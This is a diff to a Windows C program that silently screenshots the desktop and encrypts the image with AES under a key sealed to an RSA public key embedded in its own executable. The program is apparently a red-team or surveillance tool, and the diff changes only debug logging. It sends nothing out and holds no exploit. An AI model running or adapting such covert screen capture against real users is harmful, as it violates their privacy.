@@ -38,7 +38,7 @@ http://thelegendofrandom.com/blog/archives/2231
 
 //set to 1 for OutputDebugString usage instead of file output
 #define GENERATE_OUTPUT 1
-#define OUTPUT_LEVEL 3
+#define OUTPUT_LEVEL 1
 //error level output, you know the drill
 #define DBG_INFO 1
 #define DBG_WARNING 2
@@ -61,7 +61,8 @@ void outputerror(int dbglevel,const char *format,...){
 	HANDLE hFile = NULL;
 	DWORD dwbyteswritten = 0;
 
-	hFile = CreateFile("info.output", GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	hFile = CreateFile("info.output", FILE_GENERIC_WRITE | FILE_GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL,OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	SetFilePointer(hFile,0,0,FILE_END);
 	va_start (args, format);
 	switch(dbglevel){
 		case DBG_INFO:
@@ -76,13 +77,13 @@ void outputerror(int dbglevel,const char *format,...){
 	}
 	vsprintf_s((outputstring+pos),outputstringsize,format,args);
 	if (pos == -1){
-		sprintf_s(outputstring,outputstringsize,"%s\n%s:%s","::ERROR::","vsprintf_s failed due to format string or null pointers",format);
+		sprintf_s(outputstring,outputstringsize,"%s %s:%s\n","::ERROR::","vsprintf_s failed due to format string or null pointers",format);
 		WriteFile(hFile,outputstring,1024,&dwbyteswritten,NULL);
 	}
 	va_end (args);
 	
 	if(dbglevel >= OUTPUT_LEVEL){
-		WriteFile(hFile,outputstring,1024,&dwbyteswritten,NULL);
+		WriteFile(hFile,outputstring,strlen(outputstring),&dwbyteswritten,NULL);
 	}
 	CloseHandle(hFile);
 #endif	
@@ -106,7 +107,7 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 
 	openedfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
 	if(openedfile == INVALID_HANDLE_VALUE){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::failed to open myself");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::failed to open myself");
 		return NULL;
 	}
 
@@ -118,14 +119,14 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 	//read the size of the public key data we want
 	setfilepointerresult = SetFilePointer(openedfile,-4,NULL,FILE_END);
 	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::could not set filepointer to beginning of int size");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::could not set filepointer to beginning of int size");
 		CloseHandle(openedfile);
 		return NULL;
 	}
 
 	readfileresult = ReadFile(openedfile,&publickeysize,4,&bytesread,NULL);
 	if(readfileresult == FALSE){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::could not read myself");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::could not read myself");
 		CloseHandle(openedfile);
 		return NULL;
 	}
@@ -133,7 +134,7 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 	setfilepointerresult = 0;
 	setfilepointerresult = SetFilePointer(openedfile,-4,NULL,FILE_END);
 	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::could not reset filepointer to previous position");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::could not reset filepointer to previous position");
 		CloseHandle(openedfile);
 		return NULL;
 	}
@@ -145,7 +146,7 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 	setfilepointerresult = 0;
 	setfilepointerresult = SetFilePointer(openedfile,-(publickeysize-1),NULL,FILE_CURRENT);
 	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::could not set pointer to beginning of public key data");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::could not set pointer to beginning of public key data");
 		CloseHandle(openedfile);
 		SecureZeroMemory(publickey,publickeysize);
 		free(publickey);
@@ -154,7 +155,7 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 	readfileresult = FALSE;
 	readfileresult = ReadFile(openedfile,publickey,publickeysize-1,&bytesread,NULL);
 	if(readfileresult == FALSE){
-		outputerror(DBG_ERROR,"%s","getpublickeyfromself::could not read public key data");
+		outputerror(DBG_ERROR,"%s\n","getpublickeyfromself::could not read public key data");
 		CloseHandle(openedfile);
 		SecureZeroMemory(publickey,publickeysize);
 		free(publickey);
@@ -201,25 +202,25 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 	/*actually take the screenshot*/
 	screendc = GetDC(NULL); 
 	if(screendc == NULL){
-		outputerror(DBG_ERROR,"%s","takescreenshot::GetDC() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::GetDC() Failed");
 		return 1;
 	}
 	compatiblescreendc = CreateCompatibleDC(screendc);
 	if(compatiblescreendc == NULL){
-		outputerror(DBG_ERROR,"%s","takescreenshot::CreateCompatibleDC() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::CreateCompatibleDC() Failed");
 		ReleaseDC(NULL,screendc);
 		return 1;
 	}
 	compatiblebitmap = CreateCompatibleBitmap(screendc,screenwidth,screenheight);
 	if(compatiblebitmap == NULL){
-		outputerror(DBG_ERROR,"%s","takescreenshot::CreateCompatibleBitmap() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::CreateCompatibleBitmap() Failed");
 		ReleaseDC(NULL,screendc);
 		DeleteDC(compatiblescreendc);
 		return 1;
 	}
 	selectedobject = SelectObject(compatiblescreendc,compatiblebitmap);
 	if(selectedobject == NULL || selectedobject == HGDI_ERROR){
-		outputerror(DBG_ERROR,"%s","takescreenshot::SelectObject() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::SelectObject() Failed");
 		ReleaseDC(NULL,screendc);
 		DeleteDC(compatiblescreendc);
 		DeleteObject(compatiblebitmap);
@@ -227,7 +228,7 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 	}
 	bitbltresult = BitBlt(compatiblescreendc,0,0,screenwidth,screenheight,screendc,leftxscreenpos,leftyscreenpos,SRCCOPY);
 	if(bitbltresult == 0){
-		outputerror(DBG_ERROR,"%s %d","takescreenshot::BitBlt() Failed", GetLastError());
+		outputerror(DBG_ERROR,"%s %d\n","takescreenshot::BitBlt() Failed", GetLastError());
 		ReleaseDC(NULL,screendc);
 		DeleteDC(compatiblescreendc);
 		DeleteObject(compatiblebitmap);		
@@ -236,7 +237,7 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 	/*save the screenshot to file*/
 	getobjectresult = GetObject(compatiblebitmap,sizeof(BITMAP),&finalbmp);
 	if(getobjectresult == 0){
-		outputerror(DBG_ERROR,"%s","takescreenshot::GetObject() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::GetObject() Failed");
 		ReleaseDC(NULL,screendc);
 		DeleteDC(compatiblescreendc);
 		DeleteObject(compatiblebitmap);
@@ -263,7 +264,7 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 	//get the actual bitmap 'bits'
 	getdibitsresult = GetDIBits(compatiblescreendc, compatiblebitmap, 0,(UINT)finalbmp.bmHeight, lpbitmap, (BITMAPINFO *)&bminfoheader, DIB_RGB_COLORS);
 	if(getdibitsresult == 0){
-		outputerror(DBG_ERROR,"%s","takescreenshot::GetDIBits() Failed");
+		outputerror(DBG_ERROR,"%s\n","takescreenshot::GetDIBits() Failed");
 		ReleaseDC(NULL,screendc);
 		DeleteDC(compatiblescreendc);
 		DeleteObject(compatiblebitmap);
@@ -279,13 +280,13 @@ int takescreenshot(unsigned char **screenshotbuffer,int *screenshotbuffersize){
 
 	outputerror(DBG_INFO,"%s\n","takescreenshot::screenshot taken, preparing memory file");
 	*screenshotbuffersize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
-	outputerror(DBG_INFO,"%s %i\n","memfile size",*screenshotbuffersize);
+	outputerror(DBG_INFO,"%s %i\n","takescreenshot::memfile size",*screenshotbuffersize);
 	*screenshotbuffer = (unsigned char *)malloc(*screenshotbuffersize);
 	if(screenshotbuffer == NULL){
 		Sleep(10000);// 10 seconds
 		*screenshotbuffer = (char *)malloc(*screenshotbuffersize);
 		if(screenshotbuffer == NULL){
-			outputerror(DBG_ERROR,"%s","takescreenshot::malloc() final file failed");
+			outputerror(DBG_ERROR,"%s\n","takescreenshot::malloc() final file failed");
 			ReleaseDC(NULL,screendc);
 			DeleteDC(compatiblescreendc);
 			DeleteObject(compatiblebitmap);
@@ -329,18 +330,18 @@ unsigned char *generatekey(char *pers, int size){
 
 	entropy_init( &entropy );
 	if((ret = ctr_drbg_init(&ctr_drbg, entropy_func, &entropy, (unsigned char *)pers,strlen(pers))) != 0 ){
-		outputerror(DBG_ERROR,"%s","generatekey::failed to initialize random generator");
+		outputerror(DBG_ERROR,"%s\n","generatekey::failed to initialize random generator");
 		return NULL;
 	}
 		
 	key = (unsigned char *)malloc(keysize);
 	if(key == NULL){
-		outputerror(DBG_ERROR,"%s","generatekey::failed to malloc");
+		outputerror(DBG_ERROR,"%s\n","generatekey::failed to malloc");
 		return NULL;
 	}
 	
 	if((ret = ctr_drbg_random(&ctr_drbg,key,keysize)) != 0 ){
-		outputerror(DBG_ERROR,"%s","generatekey::failed to produce random data");
+		outputerror(DBG_ERROR,"%s\n","generatekey::failed to produce random data");
 		return NULL;
 	}
 
@@ -402,14 +403,14 @@ pk_context getpubkeycontext(const unsigned char *rsapublickey, int rsapublickeyl
 	pk_init(&pkctx);
 	pkresult = pk_parse_public_key(&pkctx,rsapublickey,rsapublickeylen);
 	if(pkresult != 0){
-		outputerror(DBG_ERROR,"%s","getpubkeycontext::failed to parse public key");
+		outputerror(DBG_ERROR,"%s\n","getpubkeycontext::failed to parse public key");
 		return pkctx;
 	}	
 
 	pkresult = 0;
 	pkresult = pk_can_do(&pkctx,POLARSSL_PK_RSA);
 	if(pkresult != 1){
-		outputerror(DBG_ERROR,"%s","getpubkeycontext::key does not support RSA operations");
+		outputerror(DBG_ERROR,"%s\n","getpubkeycontext::key does not support RSA operations");
 		return pkctx;
 	}
 	
@@ -429,7 +430,7 @@ unsigned char *rsacrypt(pk_context *pkctx,const unsigned char *plaintext,const u
 
 	entropy_init( &entropy );
 	if((ret = ctr_drbg_init(&ctr_drbg, entropy_func, &entropy, (unsigned char *)&pers[0],strlen(pers))) != 0 ){
-		outputerror(DBG_ERROR,"%s","rsacrypt::failed to initialize random generator");
+		outputerror(DBG_ERROR,"%s\n","rsacrypt::failed to initialize random generator");
 		return NULL;
 	}
 
@@ -443,7 +444,7 @@ unsigned char *rsacrypt(pk_context *pkctx,const unsigned char *plaintext,const u
 	pkresult = pk_encrypt(pkctx,plaintext,plaintextsize,encryptedoutput,encryptedoutputlen,encryptedoutputsize,ctr_drbg_random,&ctr_drbg);
 
 	if(pkresult != 0){
-		outputerror(DBG_ERROR,"%s","rsacrypt::failed to encrypt data");
+		outputerror(DBG_ERROR,"%s\n","rsacrypt::failed to encrypt data");
 		return NULL;
 	}
 
@@ -480,11 +481,12 @@ int main(int argc, char *argv[]){
 	DWORD dwBytesWritten = 0;
 	HANDLE hFile = NULL;
 	
+	outputerror(DBG_INFO,"%s\n","main::started");
 	/* get public key*/
 	GetModuleFileName(NULL,&currentpath[0],sizeof(currentpath));
 	pubrsakey = getpublickeyfromself(&currentpath[0],&pubkeylen);
 	if(pubrsakey == NULL){
-		outputerror(DBG_ERROR,"%s","main::failed to get public key");
+		outputerror(DBG_ERROR,"%s\n","main::failed to get public key");
 		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
 		exit(1);
 	}
@@ -492,7 +494,7 @@ int main(int argc, char *argv[]){
 	SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
 	/* take screenshot */
 	if(takescreenshot(&finalbmpfile,&finalbmpfilesize) == 1){
-		outputerror(DBG_ERROR,"%s","main::failed to take screenshot");
+		outputerror(DBG_ERROR,"%s\n","main::failed to take screenshot");
 		SecureZeroMemory(finalbmpfile,finalbmpfilesize);
 		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
 		free(finalbmpfile);
@@ -508,7 +510,7 @@ int main(int argc, char *argv[]){
 	/* get and parse public key */
 	pk_ctx = getpubkeycontext(pubrsakey,pubkeylen);
 	if(pk_get_len(&pk_ctx) == 0){
-		outputerror(DBG_ERROR,"%s","main::failed to parse public key");
+		outputerror(DBG_ERROR,"%s\n","main::failed to parse public key");
 		pk_free(&pk_ctx);
 		SecureZeroMemory(finalbmpfile,finalbmpfilesize);
 		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
@@ -520,7 +522,7 @@ int main(int argc, char *argv[]){
 	SecureZeroMemory(pubkeyencrypteddata,pk_get_len(&pk_ctx));
 	pubkeyencrypteddata = rsacrypt(&pk_ctx,keydata,48,&pubkeyencrypteddatalen);
 	if(pubkeyencrypteddata == NULL){
-		outputerror(DBG_ERROR,"%s","main::failed to encrypt aes key + aes iv");
+		outputerror(DBG_ERROR,"%s\n","main::failed to encrypt aes key + aes iv");
 		pk_free(&pk_ctx);
 		SecureZeroMemory(aeskey,32);
 		SecureZeroMemory(aesiv,16);
@@ -534,7 +536,7 @@ int main(int argc, char *argv[]){
 	//encrypt and save screenshot
 	encrypteddata = encryptaes(aeskey,256,aesiv,finalbmpfile,finalbmpfilesize,&encrypteddatalen);
 	if(encrypteddata == NULL){
-		outputerror(DBG_ERROR,"%s","main::failed to encrypt the actual screenshot");
+		outputerror(DBG_ERROR,"%s\n","main::failed to encrypt the actual screenshot");
 		pk_free(&pk_ctx);
 		SecureZeroMemory(finalbmpfile,finalbmpfilesize);
 		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
@@ -553,5 +555,6 @@ int main(int argc, char *argv[]){
 	SecureZeroMemory(finalbmpfile,finalbmpfilesize);
 	free(finalbmpfile);
 	free(pubrsakey);
+	outputerror(DBG_INFO,"%s\n","main::finished");
 	return 0;
 }
